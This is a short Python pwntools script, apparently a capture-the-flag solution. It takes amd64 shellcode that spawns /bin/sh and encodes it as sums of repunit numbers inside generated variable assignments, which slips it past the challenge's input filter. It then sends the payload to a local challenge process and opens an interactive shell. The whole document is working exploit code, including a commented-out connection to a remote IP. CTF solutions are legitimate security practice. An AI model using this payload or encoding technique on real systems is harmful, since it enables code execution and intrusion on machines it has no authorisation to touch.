## This solution was mabe by: oh_word
from pwn import *

context(os="linux", arch="amd64")

shell = shellcraft.amd64.linux.sh()
# print(shell)
# shell = asm(shell)
shell = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

ret = []
for i, c in enumerate(range(0, len(shell), 4), start=1):
    inner = []
    val = int.from_bytes(shell[c:c+4], 'little')
    
    for rep in range(10, 0, -1):
        num = int('1'*rep)
        while val >= num:
            inner.append(str(num))
            val -= num
    ret.append(f"{'a'*i}={'+'.join(inner)};")

# print("".join(ret))
# p = process()

#p = remote("74.207.229.59", 20226)
p = process(["python3", "main.py"])
p.sendlineafter(b"code? ", "".join(ret).encode())
p.sendlineafter(b"main? ", b"a")

p.interactive()
